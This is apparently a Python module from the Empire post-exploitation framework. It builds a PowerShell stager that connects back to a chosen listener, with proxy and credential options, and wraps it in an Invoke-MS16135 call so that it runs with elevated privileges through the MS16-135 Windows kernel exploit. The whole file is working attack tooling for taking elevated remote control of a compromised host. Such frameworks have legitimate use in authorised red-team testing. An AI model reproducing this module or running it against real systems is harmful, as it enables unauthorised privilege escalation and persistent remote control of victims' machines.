from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        # generate the launcher code without base64 encoding
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        # generate the PowerShell one-liner with all of the proper options set
        launcher = main_menu.stagers.generate_launcher(
            listenerName=listener_name,
            language="powershell",
            encode=False,
            userAgent=user_agent,
            proxy=proxy,
            proxyCreds=proxy_creds,
        )
        # need to escape characters
        launcher_code = launcher.replace("`", "``").replace("$", "`$").replace('"', "'")

        script_end = 'Invoke-MS16135 -Command "' + launcher_code + '"'
        script_end += ';"`nInvoke-MS16135 completed."'

        return script, script_end
